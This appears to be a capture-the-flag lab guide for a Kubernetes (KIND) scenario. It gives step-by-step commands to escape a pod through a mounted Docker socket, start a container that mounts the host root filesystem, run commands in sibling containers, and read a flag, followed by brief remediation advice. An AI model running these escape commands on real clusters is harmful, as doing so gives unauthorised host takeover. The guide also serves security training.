# K8S-17: Docker Socket Mount Escape

## 场景信息

| 字段 | 值 |
|---|---|
| ID | K8S-17 |
| 名称 | Docker Socket Mount Escape |
| 技术/CVE | Docker socket abuse |
| 难度 | L1 |
| 交付方式 | KIND / Kubernetes |
| 入口 | KIND 集群内入口（无固定宿主端口） |

## 场景概述
- 技术：Docker socket abuse
- 难度：L1
- 交付方式：k8s
## 攻击路径与利用步骤

## Overview
| Property | Value |
|----------|-------|
| CVE/Technique | Docker socket abuse (container runtime socket) |
| Difficulty | L1 |
| Type | k8s (KIND cluster) |
| Cluster Name | cve-k8s-17-docker-sock |
| Flag Location | `/home/kianabin/cve-flags/k8s-17/flag.txt` on the host (reachable only through the Docker daemon) |

## Attack Path Summary
1. Pod has `/var/run/docker.sock` mounted via hostPath (extraMounts map host Docker socket into KIND node, then hostPath into pod)
2. Pod uses `docker:cli` image (contains the Docker CLI binary)
3. Use `docker` CLI to communicate with the host's Docker daemon
4. Launch a container that mounts the host filesystem via `-v /host-flag:/mnt`
5. Read the flag from the sibling container

## Prerequisites
- kubectl access to KIND cluster `cve-k8s-17-docker-sock`
- Pod name: `docker-escape-pod`
- Tools inside pod: `docker` CLI

## Step-by-Step Exploitation

### Step 1: Initial Access
Exec into the pod with the Docker socket mounted:

```bash
kubectl exec -it docker-escape-pod -- sh
```

Verify the Docker socket is accessible:

```bash
ls -la /var/run/docker.sock
# Expected: srw-rw---- 1 root docker ... /var/run/docker.sock

# Test communication with the host Docker daemon
docker version
# Expected: Client and Server version info
```

### Step 2: List Images on Host Docker
Enumerate available images:

```bash
docker images
# Expected: list of images available on the host Docker daemon
```

### Step 3: Launch Escape Container
Run a new container through the host Docker that mounts the host filesystem:

```bash
docker run --rm \
    -v /home/kianabin/cve-flags/k8s-17:/mnt/flag \
    alpine:latest \
    cat /mnt/flag/flag.txt
```

**Explanation:**
- `-v /home/kianabin/cve-flags/k8s-17:/mnt/flag` mounts the host's flag directory (which contains `flag.txt`) into the new container at `/mnt/flag`
- `alpine:latest` is the image to run (will be pulled if not cached)
- `cat /mnt/flag/flag.txt` reads the flag file

If `alpine:latest` is not available, pull it first:

```bash
docker pull alpine:latest
```

### Step 4: Interactive Host Access
For full interactive access to the host filesystem:

```bash
# Get an interactive shell on the host
docker run --rm -it \
    -v /:/host \
    alpine:latest \
    /bin/sh
```

From the escape shell:

```bash
cat /host/home/kianabin/cve-flags/k8s-17/flag.txt
# Or explore the full host filesystem under /host/
```

### Step 5: Advanced Attacks via Docker Socket
With access to the Docker socket, you can also:

```bash
# List all running containers (including kubelet, etc.)
docker ps

# Inspect other containers
docker inspect <container-id>

# Execute commands in other containers
docker exec <container-id> cat /etc/hostname

# Access host network namespace
docker run --rm --network=host alpine:latest ip addr
```

### Step 6: Capture Flag
- Flag format: `flag{k8s-17-*}`
- Flag location: `/home/kianabin/cve-flags/k8s-17/flag.txt` on the host (reachable only through the Docker daemon)
- Via Docker escape: `docker run --rm -v /home/kianabin/cve-flags/k8s-17:/mnt alpine cat /mnt/flag.txt`
- Expected output: `flag{k8s-17-default}` (or custom value from `CVE_FLAG`)

## Verification Commands
```bash
# Verify the scenario is deployed and running
kubectl get pod docker-escape-pod
# Expected: NAME                READY   STATUS    RESTARTS   AGE
#           docker-escape-pod   1/1     Running   0          ...

# Verify Docker socket is mounted
kubectl exec docker-escape-pod -- ls -la /var/run/docker.sock
# Expected: srw-rw---- 1 root docker ... /var/run/docker.sock

# Quick exploit verification (single line)
kubectl exec docker-escape-pod -- docker run --rm -v /home/kianabin/cve-flags/k8s-17:/mnt alpine cat /mnt/flag.txt
```

## 此场景利用了哪些知识

| 规划维度 | 所需知识 |
|---|---|
| 环境与访问 | Docker daemon socket and Docker API |
| 侦察与前置条件 | Mounted docker.sock discovery and daemon privilege model |
| 核心漏洞与利用 | Use the Docker socket to run a host-mounted privileged container |
| 权限、横向或影响 | Host takeover through Docker daemon access |
| 验证 | Read the host flag from the spawned container |

## 修复建议
升级或修复对应组件，移除导致攻击路径的非必要权限、网络暴露或不安全默认配置，并在修复后复测本指南中的利用步骤。
